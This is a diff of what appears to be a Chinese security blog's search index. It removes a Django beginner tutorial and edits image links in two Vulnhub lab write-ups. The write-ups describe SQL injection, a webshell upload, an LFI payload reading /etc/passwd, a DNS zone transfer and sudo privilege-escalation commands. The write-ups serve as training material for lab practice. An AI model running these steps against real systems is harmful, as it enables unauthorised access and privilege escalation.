-<p>1、Python 下载地址：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p>
-<p>2、Django 下载地址：<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
-<p><strong>注意：</strong>目前 Django 2.2.x 以上版本已经完全兼容 Python 3.x。</p>
-<h3 id="Python-安装-已安装的可跳过"><a href="#Python-安装-已安装的可跳过" class="headerlink" title="Python 安装(已安装的可跳过)"></a>Python 安装(已安装的可跳过)</h3><p>安装 Python 你只需要下载 python-x.x.x.msi 文件，然后一直点击 “Next” 按钮即可。</p>
-<p><img src="https://www.runoob.com/wp-content/uploads/2015/01/install1.png" alt="img"></p>
-<h3 id="Django-安装-1"><a href="#Django-安装-1" class="headerlink" title="Django 安装"></a>Django 安装</h3><p>使用pip安装Django即可,加-i参数使用阿里云的pipy源,速度快.<br>命令:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install Django==2.2 -i https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>
-
-<h3 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h3><p>输入以下命令进行检查:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import django</span><br><span class="line">&gt;&gt;&gt; django.get_version()</span><br><span class="line">&#x27;2.2&#x27;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-<p>如果输出了Django的版本号说明安装正确。</p>
-<h2 id="Django-创建项目"><a href="#Django-创建项目" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h2><p>本章我们将介绍Django 管理工具及如何使用 Django 来创建项目，第一个项目我们以 HelloWorld 来命令项目。</p>
-<p>测试版本说明：</p>
-<ul>
-<li>Python 3.6.8</li>
-<li>Django 2.2<h3 id="Django-管理工具"><a href="#Django-管理工具" class="headerlink" title="Django 管理工具"></a>Django 管理工具</h3></li>
-</ul>
-<p>安装 Django 之后，您现在应该已经有了可用的管理工具 django-admin.py，Windows 如果没有配置环境变量可以用 django-admin。</p>
-<p>我们可以使用 django-admin.py 来创建一个项目:<br>我们可以来看下django-admin 的命令介绍:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">Type</span> &#x27;django-admin <span class="built_in">help</span> &lt;subcommand&gt;&#x27; <span class="keyword">for</span> <span class="built_in">help</span> on a specific subcommand.</span><br><span class="line"></span><br><span class="line">Available subcommands:</span><br><span class="line"></span><br><span class="line">[django]</span><br><span class="line">    check</span><br><span class="line">    compilemessages</span><br><span class="line">    createcachetable</span><br><span class="line">    dbshell</span><br><span class="line">    diffsettings</span><br><span class="line">    dumpdata</span><br><span class="line">    flush</span><br><span class="line">    inspectdb</span><br><span class="line">    loaddata</span><br><span class="line">    makemessages</span><br><span class="line">    makemigrations</span><br><span class="line">    migrate</span><br><span class="line">    runserver</span><br><span class="line">    sendtestemail</span><br><span class="line">    shell</span><br><span class="line">    showmigrations</span><br><span class="line">    sqlflush</span><br><span class="line">    sqlmigrate</span><br><span class="line">    sqlsequencereset</span><br><span class="line">    squashmigrations</span><br><span class="line">    startapp</span><br><span class="line">    startproject</span><br><span class="line">    test</span><br><span class="line">    testserver</span><br></pre></td></tr></table></figure>
-
-<h3 id="Django-创建项目-1"><a href="#Django-创建项目-1" class="headerlink" title="Django 创建项目"></a>Django 创建项目</h3><p>使用 django-admin 来创建 Hello 项目：</p>
-<blockquote>
-<p>django-admin startproject Hello</p>
-</blockquote>
-<p>使用tree /F来查看目录结构：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">tree</span> /F</span><br><span class="line"><span class="function">D:.</span></span><br><span class="line"><span class="function">│  <span class="title">manage.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">Hello</span></span></span><br><span class="line"><span class="function">        <span class="title">settings.py</span></span></span><br><span class="line"><span class="function">        <span class="title">urls.py</span></span></span><br><span class="line"><span class="function">        <span class="title">wsgi.py</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure>
-
-<p>目录说明：</p>
-<ul>
-<li><strong>HelloWorld:</strong> 项目的容器。</li>
-<li><strong>manage.py:</strong> 一个实用的命令行工具，可让你以各种方式与该 Django 项目进行交互。</li>
-<li><strong>HelloWorld/<strong>init</strong>.py:</strong> 一个空文件，告诉 Python 该目录是一个 Python 包。</li>
-<li><strong>HelloWorld/settings.py:</strong> 该 Django 项目的设置/配置。</li>
-<li><strong>HelloWorld/urls.py:</strong> 该 Django 项目的 URL 声明; 一份由 Django 驱动的网站”目录”。</li>
-<li><strong>HelloWorld/wsgi.py:</strong> 一个 WSGI 兼容的 Web 服务器的入口，以便运行你的项目。</li>
-</ul>
-<p>接下来我们进入 Hello 目录输入以下命令，启动服务器：</p>
-<blockquote>
-<p>py -3 manage.py runserver 0.0.0.0:8000</p>
-</blockquote>
-<p>0.0.0.0 让其它电脑可连接到开发服务器，8000 为端口号。如果不说明，那么端口号默认为 8000。<br>在浏览器输入你服务器的 ip（这里我们输入本机 IP 地址： 127.0.0.1:8000） 及端口号，如果正常启动，输出结果如下：<br><img src="https://img.xpctf.cn/img/20201012123556.png-xpctf" alt=""></p>
-<h3 id="Django-创建应用"><a href="#Django-创建应用" class="headerlink" title="Django 创建应用"></a>Django 创建应用</h3><p>使用<code>py -3 manage.py startapp App</code>创建一个应用，<br>目录结构：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">Desktop</span>\<span class="title">django</span>\<span class="title">Hello</span>&gt;<span class="title">tree</span> <span class="title">App</span> /<span class="title">F</span></span></span><br><span class="line"><span class="function">卷 软件 的文件夹 <span class="title">PATH</span> 列表</span></span><br><span class="line"><span class="function">卷序列号为 2901-4<span class="title">EB1</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">USERS</span>\<span class="title">ADMINISTRATOR</span>\<span class="title">DESKTOP</span>\<span class="title">DJANGO</span>\<span class="title">HELLO</span>\<span class="title">APP</span></span></span><br><span class="line"><span class="function">│  <span class="title">admin.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">apps.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">models.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">tests.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">views.py</span></span></span><br><span class="line"><span class="function">│  <span class="title">__init__.py</span></span></span><br><span class="line"><span class="function">│</span></span><br><span class="line"><span class="function">└─<span class="title">migrations</span></span></span><br><span class="line"><span class="function">        <span class="title">__init__.py</span></span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Django-项目配置"><a href="#Django-项目配置" class="headerlink" title="Django 项目配置"></a>Django 项目配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASE_DIR	#项目路径</span><br><span class="line">SECRET_KEY	#签名key</span><br><span class="line">DEBUG		#调试模式</span><br><span class="line">ALLOWED_HOSTS	#允许访问列表 ALLOWED_HOSTS = [&#x27;*&#x27;] #允许所有访问</span><br><span class="line">INSTALLED_APPS	#安装应用 自己创建的应用需要加入到该列表，应用名即可</span><br><span class="line">MIDDLEWARE	#中间件</span><br><span class="line">ROOT_URLCONF	#根路由 Django中各个应用有个路由</span><br><span class="line">TEMPLATES	#模板配置</span><br><span class="line">	BACKEND	#模板引擎</span><br><span class="line">	DIRS	#模板路径</span><br><span class="line">WSGI_APPLICATION	#项目入口</span><br><span class="line">DATABASES	#数据库配置</span><br><span class="line">AUTH_PASSWORD_VALIDATORS	#访问验证</span><br><span class="line">LANGUAGE_CODE = &#x27;zh-hans&#x27;	#简体中文语言</span><br><span class="line">TIME_ZONE = &#x27;Asia/Shanghai&#x27;	#上海时区</span><br><span class="line">USE_TZ = False	#不适用国际标准时间</span><br><span class="line">STATIC_URL	#静态资源请求路径</span><br></pre></td></tr></table></figure>
-<p>设置后继续runserver，默认界面变成中文显示。<br><img src="https://img.xpctf.cn/img/20201012132637.png-xpctf" alt=""></p>
-<h3 id="自定义主页"><a href="#自定义主页" class="headerlink" title="自定义主页"></a>自定义主页</h3><p>修改urls.py文件，在urlpatterns列表里增加<code>path(&#39;&#39;,views.index,name=&#39;index&#39;)</code>，在views.py定义index函数:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello World&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="pycharm创建项目"><a href="#pycharm创建项目" class="headerlink" title="pycharm创建项目"></a>pycharm创建项目</h3><p>File=&gt;New project=&gt;Django=&gt;配置项目路径=&gt;配置Python路径=&gt;配置模板=&gt;配置应用名称=&gt;create<br><img src="https://img.xpctf.cn/img/20201012134758.png-xpctf" alt=""></p>
-<h2 id="Django-路由"><a href="#Django-路由" class="headerlink" title="Django 路由"></a>Django 路由</h2><h3 id="创建子路由"><a href="#创建子路由" class="headerlink" title="创建子路由"></a>创建子路由</h3><p>Hello目录下的路由是根路由，每个应用都可以有自己的路由，应用路由互相不影响。</p>
-<p>在应用目录新建urls.py文件，写入：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path <span class="comment">#导入path模块</span></span><br><span class="line"><span class="keyword">from</span> App <span class="keyword">import</span> views   <span class="comment">#导入应用views文件</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;home/&#x27;</span>,views.home,name=<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-<p>在views.py里定义函数：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Home&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>在根路由列表里包含子路由列表：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line">path(<span class="string">&#x27;&#x27;</span>,include(<span class="string">&quot;App.urls&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>pycharm技巧：选中views按Alt+Enter键可以导入快速导入模块，选中home可以自动生成home函数。</p>
-<h2 id="Django-模板和模型"><a href="#Django-模板和模型" class="headerlink" title="Django 模板和模型"></a>Django 模板和模型</h2><h3 id="设置模型路径"><a href="#设置模型路径" class="headerlink" title="设置模型路径"></a>设置模型路径</h3><p>在Hello目录下载新建templates文件夹，用来存储模板，修改settings.py的TEMPLATES列表下的DIRS值为[os.path.join(BASE_DIR, ‘templates’)]。<br><img src="https://img.xpctf.cn/img/20201012163739.png-xpctf" alt=""></p>
-<h3 id="新建模型"><a href="#新建模型" class="headerlink" title="新建模型"></a>新建模型</h3><p>在templates文件夹中新建index.html文件：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Hello, &#123;&#123; name &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>注意：</strong>模板文件中不能出现中文</p>
-<h3 id="使用模板"><a href="#使用模板" class="headerlink" title="使用模板"></a>使用模板</h3><p>render是Django提供的一个渲染Html的模块<br>request是一个固定参数, 没什么好讲的<br>index.html是模板文件<br>context是要传入文件中用于渲染呈现的数据, 默认是字典格式</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;Django&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;china&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;index.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure>
-
-<h3 id="连接sqllite3数据库"><a href="#连接sqllite3数据库" class="headerlink" title="连接sqllite3数据库"></a>连接sqllite3数据库</h3><p>如果pycharm是专业版，点击最右边的database选项，在弹出的界面选择data source，找到SQLlite数据库，按照下图配置即可。<br><img src="https://img.xpctf.cn/img/20201012170716.png-xpctf" alt=""></p>
-<h3 id="新建模型-1"><a href="#新建模型-1" class="headerlink" title="新建模型"></a>新建模型</h3><p>创建User类，继承models.Model属性，创建UserName和PassWord列名，并指定表名。</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line">class User(models.Model):</span><br><span class="line">    UserName = models.CharField(max_length=10)</span><br><span class="line">    PassWord = models.CharField(max_length=128)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;Users&#x27; #指定表名</span><br></pre></td></tr></table></figure>
-
-<p>使用下面命令更新models并创建数据库：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">py -<span class="number">3</span> manage.py makemigrations	#让 Django 知道我们在我们的模型有一些变更</span><br><span class="line">py -<span class="number">3</span> manage.py migrate	## 创建表结构</span><br></pre></td></tr></table></figure>
-<p>完成后Django会自动创建表，并插入列名，ID列名自动增加并设置为主键。</p>
-<h3 id="数据库加入数据"><a href="#数据库加入数据" class="headerlink" title="数据库加入数据"></a>数据库加入数据</h3><p>选中database后双击User数据库，点击上面的+号，编辑你要加入的内容，点击&gt;&gt;展开，点击有DB的按钮提交到数据库即可。<br><img src="https://img.xpctf.cn/img/20201012191622.png-xpctf" alt=""></p>
-<h3 id="反向生成模型"><a href="#反向生成模型" class="headerlink" title="反向生成模型"></a>反向生成模型</h3><p>反向生成模型是根据数据库列名来生成模型，Django给我提供了这个功能，只需要使用：<br><code>py -3 manage.py inspectdb Users &gt; App/Users.py</code><br>生成Users表的模型保存到App/Users.py，如果忽略Users，当前连接的数据所有表Model<br><img src="https://img.xpctf.cn/img/20201012200915.png-xpctf" alt=""></p>
-<h3 id="遍历数据库用户"><a href="#遍历数据库用户" class="headerlink" title="遍历数据库用户"></a>遍历数据库用户</h3><p>在templates文件夹创建user_list.html文件，写入：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh_cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    &#123;% for user in users %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.UserName &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在App路由列表”urls.py”中增加<code>path(&#39;list/&#39;,views.user_list,name=&#39;user_list&#39;)</code></p>
-<p>在views.py中添加内容：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_list</span>(<span class="params">request</span>):</span></span><br><span class="line">    users = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:<span class="string">&#x27;用户列表&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;users&#x27;</span>:users,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;user_list.html&quot;</span>,context=context)</span><br></pre></td></tr></table></figure>
-
-<h2 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>
-]]></content>
-      <categories>
-        <category>Python</category>
-        <category>Django</category>
-      </categories>
-      <tags>
-        <tag>Django</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>FUNBOX: EASY Writeup</title>
     <url>/posts/872/</url>
     <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>描述上说有很多兔子洞，我没怎么踩，唯一的坑就是在提权到用户的踩了。<br>靶机IP：192.168.10.58<br>Kali：192.168.10.12</p>
-<p>nmap扫描：<code>nmap -A -p- -T4 -v -oA nmap 192.168.10.58</code><br><img src="https://img.xpctf.cn/img/20200922160315.png-xpctf" alt=""><br>开放端口：22 80 33060</p>
-<p>先dirb扫描目录，发现了几个有用的目录，先访问robots.txt,看到了gym目录<br><img src="https://img.xpctf.cn/img/20200922161654.png-xpctf" alt=""></p>
+<p>nmap扫描：<code>nmap -A -p- -T4 -v -oA nmap 192.168.10.58</code><br><img src="https://img.xpctf.cn/img/20200922160315.png" alt=""><br>开放端口：22 80 33060</p>
+<p>先dirb扫描目录，发现了几个有用的目录，先访问robots.txt,看到了gym目录<br><img src="https://img.xpctf.cn/img/20200922161654.png" alt=""></p>
 <p>通过搜索发现了gym是健身管理系统并存在一个文件上传漏洞，执行的脚本无果，应该是兔子洞，继续看其他目录。</p>
-<p>admin目录打开是一个后他界面，尝试了弱口令无果，继续看secret和store目录。终于在store看到了希望，看到了一个pubid参数，尝试sql注入。<br><img src="https://img.xpctf.cn/img/20200922161810.png-xpctf" alt=""></p>
-<p>输入单引号后爆出sql语句错误，上sqlmap跑。<br><img src="https://img.xpctf.cn/img/20200922161935.png-xpctf" alt=""></p>
-<p>最后得出store库admin表的账号密码，使用帐号密码登录store后台。<br><img src="https://img.xpctf.cn/img/20200922162028.png-xpctf" alt=""></p>
-<p>在编辑书本信息处找到了文件上传页面，尝试上传webshell。<br><img src="https://img.xpctf.cn/img/20200922162526.png-xpctf" alt=""></p>
-<p>webshell上传成功，没有任何过滤，nc监听端口，去网站刷新一下拿到webshell。<br><img src="https://img.xpctf.cn/img/20200923083649.png-xpctf" alt=""></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在tony用户家目录找到一个password.txt文件，ssh: yxcvbnmYYY就是tony用户的密码，我卡了半天。<br><img src="https://img.xpctf.cn/img/20200923083841.png-xpctf" alt=""><br>使用ssh连接到tony用户，发现该用户拥有sudo权限和lxd组<br><img src="https://img.xpctf.cn/img/20200923084058.png-xpctf" alt=""></p>
-<p>由于funbox:2就是lxd提权，这次改成sudo提权，sudo命令较多，大部分都可以提权，我们选用最简单的/usr/bin/pkexec提权：<code>sudo -u root /usr/bin/pkexec /bin/sh</code><br><img src="https://img.xpctf.cn/img/20200923084255.png-xpctf" alt=""><br>time也很好提权：<code>sudo time /bin/bash</code><br><img src="https://img.xpctf.cn/img/20200923084343.png-xpctf" alt=""></p>
+<p>admin目录打开是一个后他界面，尝试了弱口令无果，继续看secret和store目录。终于在store看到了希望，看到了一个pubid参数，尝试sql注入。<br><img src="https://img.xpctf.cn/img/20200922161810.png" alt=""></p>
+<p>输入单引号后爆出sql语句错误，上sqlmap跑。<br><img src="https://img.xpctf.cn/img/20200922161935.png" alt=""></p>
+<p>最后得出store库admin表的账号密码，使用帐号密码登录store后台。<br><img src="https://img.xpctf.cn/img/20200922162028.png" alt=""></p>
+<p>在编辑书本信息处找到了文件上传页面，尝试上传webshell。<br><img src="https://img.xpctf.cn/img/20200922162526.png" alt=""></p>
+<p>webshell上传成功，没有任何过滤，nc监听端口，去网站刷新一下拿到webshell。<br><img src="https://img.xpctf.cn/img/20200923083649.png" alt=""></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>在tony用户家目录找到一个password.txt文件，ssh: yxcvbnmYYY就是tony用户的密码，我卡了半天。<br><img src="https://img.xpctf.cn/img/20200923083841.png" alt=""><br>使用ssh连接到tony用户，发现该用户拥有sudo权限和lxd组<br><img src="https://img.xpctf.cn/img/20200923084058.png" alt=""></p>
+<p>由于funbox:2就是lxd提权，这次改成sudo提权，sudo命令较多，大部分都可以提权，我们选用最简单的/usr/bin/pkexec提权：<code>sudo -u root /usr/bin/pkexec /bin/sh</code><br><img src="https://img.xpctf.cn/img/20200923084255.png" alt=""><br>time也很好提权：<code>sudo time /bin/bash</code><br><img src="https://img.xpctf.cn/img/20200923084343.png" alt=""></p>
 <p>提权字典：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
 ]]></content>
       <categories>
@@ -514,22 +514,22 @@
 <li>Port 80 Apache Web Server-我们可以尝试利用某些Web漏洞并获得低特权的webShell。</li>
 <li>端口10000 Webmin MiniServer-根据版本以及我们是否可以获得登录凭据，绝对可以利用此端口。</li>
 </ul>
-<p>我们首先在端口80上开始枚举，因为我发现它很容易。在80端口，我们有一个提供宽带服务的网站。<br><img src="https://img.xpctf.cn/img/20200927163552.png-xpctf" alt=""><br>我尝试查看页面源代码和网站上的其他链接，但没有发现任何有用的东西。因此，接下来我开始进行gobuster扫描以查找隐藏的目录。</p>
+<p>我们首先在端口80上开始枚举，因为我发现它很容易。在80端口，我们有一个提供宽带服务的网站。<br><img src="https://img.xpctf.cn/img/20200927163552.png" alt=""><br>我尝试查看页面源代码和网站上的其他链接，但没有发现任何有用的东西。因此，接下来我开始进行gobuster扫描以查找隐藏的目录。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# gobuster dir -u http://192.168.10.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.10.63/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     php,html</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/27 16:41:52 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/img (Status: 301)</span><br><span class="line">/account (Status: 301)</span><br><span class="line">/css (Status: 301)</span><br><span class="line">/js (Status: 301)</span><br><span class="line">/statement.html (Status: 200)</span><br><span class="line">/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/27 16:46:04 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
 
-<p>我去了/account目录，找到了一个登录页面。我尝试使用一些弱口令用户名和密码登录，但无法登录。但是我注意到URL中的一个include参数似乎很有趣。<br><img src="https://img.xpctf.cn/img/20200927190856.png-xpctf" alt=""><br>让我们看看是否可以在此参数中找到LFI漏洞。如果将include请求的cookiewarning部分更改为典型的LFI有效内容，例如“ ../../../../etc/passwd”，我们可以看到它返回了/var/www/html目录，然后读取/etc/passwd。<br><img src="https://img.xpctf.cn/img/20200927191100.png-xpctf" alt=""><br>这完美地工作了，但是我仍然找不到使用此漏洞的方法。因此，我进行了进一步的列举。</p>
-<h2 id="获得用户shell"><a href="#获得用户shell" class="headerlink" title="获得用户shell"></a>获得用户shell</h2><p>我使用在端口10000上运行的Webmin Miniserv。当尝试在浏览器上访问它时，我们收到一个错误，该错误泄漏了子域。<br><img src="https://img.xpctf.cn/img/20200927191215.png-xpctf" alt=""><br>我将此主机名添加到主机文件中，现在可以查看webmin登录页面。但不幸的是，我没有任何线索。因此，接下来我开始枚举端口53，以查看是否可以找到其他一些子域。由于这是在侦听TCP，因此我使用了dig axfr命令查找其他子域。</p>
+<p>我去了/account目录，找到了一个登录页面。我尝试使用一些弱口令用户名和密码登录，但无法登录。但是我注意到URL中的一个include参数似乎很有趣。<br><img src="https://img.xpctf.cn/img/20200927190856.png" alt=""><br>让我们看看是否可以在此参数中找到LFI漏洞。如果将include请求的cookiewarning部分更改为典型的LFI有效内容，例如“ ../../../../etc/passwd”，我们可以看到它返回了/var/www/html目录，然后读取/etc/passwd。<br><img src="https://img.xpctf.cn/img/20200927191100.png" alt=""><br>这完美地工作了，但是我仍然找不到使用此漏洞的方法。因此，我进行了进一步的列举。</p>
+<h2 id="获得用户shell"><a href="#获得用户shell" class="headerlink" title="获得用户shell"></a>获得用户shell</h2><p>我使用在端口10000上运行的Webmin Miniserv。当尝试在浏览器上访问它时，我们收到一个错误，该错误泄漏了子域。<br><img src="https://img.xpctf.cn/img/20200927191215.png" alt=""><br>我将此主机名添加到主机文件中，现在可以查看webmin登录页面。但不幸的是，我没有任何线索。因此，接下来我开始枚举端口53，以查看是否可以找到其他一些子域。由于这是在侦听TCP，因此我使用了dig axfr命令查找其他子域。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~/桌面/vulnhub/greenoptic# dig axfr @192.168.10.63 greenoptic.vm</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.4-Debian &lt;&lt;&gt;&gt; axfr @192.168.10.63 greenoptic.vm</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">greenoptic.vm.		3600	IN	SOA	websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600</span><br><span class="line">greenoptic.vm.		3600	IN	NS	ns1.greenoptic.vm.</span><br><span class="line">ns1.greenoptic.vm.	3600	IN	A	127.0.0.1</span><br><span class="line">recoveryplan.greenoptic.vm. 3600 IN	A	127.0.0.1</span><br><span class="line">websrv01.greenoptic.vm.	3600	IN	A	127.0.0.1</span><br><span class="line">greenoptic.vm.		3600	IN	SOA	websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600</span><br><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 192.168.10.63#53(192.168.10.63)</span><br><span class="line">;; WHEN: 日 9月 27 19:13:23 CST 2020</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 235)</span><br></pre></td></tr></table></figure>
-<p>我们看到另一个名为recoveryplan的子域，我很快将其添加到主机文件中。<br><img src="https://img.xpctf.cn/img/20200927191442.png-xpctf" alt=""></p>
